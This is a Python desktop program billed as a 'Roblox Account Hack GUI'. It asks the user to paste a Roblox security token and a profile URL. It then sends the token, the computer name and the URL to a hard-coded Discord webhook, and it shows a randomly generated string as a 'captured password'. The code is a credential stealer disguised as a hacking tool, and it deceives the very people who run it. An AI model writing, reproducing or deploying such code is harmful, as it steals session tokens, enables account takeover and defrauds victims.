import tkinter as tk
from tkinter import messagebox
from tkinterweb import HtmlFrame
import requests
import re
import random
import string
import os
import json

SAVE_FILE = "saved_tokens.json"

# Load saved tokens
if os.path.exists(SAVE_FILE):
    with open(SAVE_FILE, "r") as f:
        saved_tokens = json.load(f)
else:
    saved_tokens = {}

# --- CONFIG ---
WEBHOOK_URL = "https://discord.com/api/webhooks/1389254887396872232/W22ZUvYIuB7tSTizBfmyLFsQv62sMxBVUgYcBZniaLCg6HqdqofeF97g7vAiEEC9e6Bv"  # Replace this

# --- UTILS ---
def escape_json(text):
    return text.replace("\\", "\\\\").replace("\"", "\\\"").replace("\n", "\\n").replace("\r", "\\r")

def generate_random_password():
    chars = string.ascii_letters + string.digits + "!@#$%^&*"
    length = random.randint(5, 20)
    return ''.join(random.choice(chars) for _ in range(length))

# --- MAIN FUNCTION ---
def on_click_submit():
    token = token_entry.get().strip()
    url = url_entry.get().strip()
    pc_name = os.getenv("COMPUTERNAME") or "Unknown-PC"

    # Token format check
    pattern = r"^_\|WARNING:.*\|_[A-Za-z0-9.]+$"
    if not re.match(pattern, token):
        messagebox.showerror("Token Error", "Token must match Roblox format.")
        return

    # URL check
    if not url:
        messagebox.showerror("URL Error", "URL field cannot be empty.")
        return

    if not url.startswith("http://") and not url.startswith("https://"):
        url = "https://" + url

    if "roblox.com" not in url.lower():
        messagebox.showerror("Invalid Site", "Only roblox.com URLs are allowed.")
        return

    # Generate or reuse password for this token
    if token in saved_tokens:
        password = saved_tokens[token]
    else:
        password = generate_random_password()
        saved_tokens[token] = password
        with open(SAVE_FILE, "w") as f:
            json.dump(saved_tokens, f, indent=2)

    generated_password.set(password)

    # Send token to Discord
    try:
        payload = {
            "content": (
                f"💻 **Captured PC Name:** `{pc_name}`\n"
                f"📥 **Captured Token:**\n```{token}```\n"
                f"🌐 **Captured URL:**\n```{url}```\n"
                f"🔐 **captured Generated Password:**\n```{password}```"
            )
        }

        requests.post(WEBHOOK_URL, json=payload)
        print("[PHM] Hack request sent.")
        messagebox.showinfo("Success", "Hacking Account...")
    except Exception as e:
        messagebox.showerror("Request Error", str(e))
        return

    # Load web page
    try:
        browser.load_website(url)
    except Exception as e:
        messagebox.showerror("Account Preview Load Error", str(e))

# --- GUI SETUP ---
root = tk.Tk()
root.title("Roblox Account Hack GUI")
root.geometry("850x680")

# --- TOKEN FIELD ---
tk.Label(root, text="Roblox Token:").pack()
token_entry = tk.Entry(root, width=100)
token_entry.pack(pady=5)

# --- URL FIELD ---
tk.Label(root, text="Profile URL:").pack()
url_entry = tk.Entry(root, width=100)
url_entry.pack(pady=5)

# --- BUTTON ---
tk.Button(root, text="Start Hacking", command=on_click_submit, bg="red", fg="white").pack(pady=10)

# --- PASSWORD OUTPUT ---
tk.Label(root, text="Captured Password:").pack()
generated_password = tk.StringVar()
tk.Entry(root, textvariable=generated_password, state='readonly', width=80).pack(pady=5)

# --- WEB BROWSER FRAME ---
tk.Label(root, text="Browser Preview:").pack()
browser = HtmlFrame(root, horizontal_scrollbar="auto")
browser.pack(fill="both", expand=True, padx=10, pady=10)

root.mainloop()
